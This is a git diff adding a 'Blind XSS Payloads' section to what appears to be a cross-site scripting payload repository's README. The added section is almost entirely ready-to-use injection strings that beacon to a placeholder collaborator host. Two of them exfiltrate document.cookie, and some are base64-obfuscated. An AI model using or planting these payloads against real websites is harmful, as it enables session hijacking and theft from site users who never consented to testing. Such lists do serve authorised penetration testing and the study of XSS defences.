@@ -187,3 +187,31 @@ This repository features payloads for the following XSS attack types:
 - `#'><img src=x onerror=alert('DOM XSS')>`
 
 ---
+
+# Blind XSS Payloads
+
+### Common Blind XSS Payloads
+- `<script src=https://your-burpcollaborator.com></script>`
+- `"><script src=https://your-burpcollaborator.com></script>`
+- `"><img src=x onerror=this.src='https://your-burpcollaborator.com'>`
+- `"><iframe src="javascript:eval('dGhpcy5sb2NhdGlvbiA9ICdodHRwczovL3lvdXItYnVycGNvbGxhYm9yYXRvci5jb20nOw==')"></iframe>`
+- `"><svg onload=eval(atob('YWxlcnQoJ0JsaW5kIFhTUycp'))>`
+- `"><body onload="fetch('https://your-burpcollaborator.com')">`
+- `"><link rel="stylesheet" href="https://your-burpcollaborator.com">`
+- `"><a href="javascript:fetch('https://your-burpcollaborator.com')">Click me</a>`
+- `"><input value="" onfocus="fetch('https://your-burpcollaborator.com')">`
+- `"><div onmouseover="fetch('https://your-burpcollaborator.com')">Hover me</div>`
+
+### Advanced Blind XSS Techniques
+- `"><img src=x onerror=eval(atob('YWxlcnQoJ0JsaW5kIFhTUycp'))>`
+- `"><svg onload="fetch('https://your-burpcollaborator.com')">`
+- `"><iframe src="javascript:fetch('https://your-burpcollaborator.com')"></iframe>`
+- `"><script>new Image().src='https://your-burpcollaborator.com?cookie='+document.cookie</script>`
+- `"><img src=1 onerror="new Image().src='https://your-burpcollaborator.com?cookie='+document.cookie">`
+- `"><img src=x onerror='fetch("https://your-burpcollaborator.com")'>`
+- `"><iframe src="javascript:alert('Blind XSS')"></iframe>`
+- `"><marquee onstart="fetch('https://your-burpcollaborator.com')">Scroll me</marquee>`
+- `"><input value="" onfocus="fetch('https://your-burpcollaborator.com')">`
+- `"><a href="javascript:fetch('https://your-burpcollaborator.com')">Click me</a>`
+
+
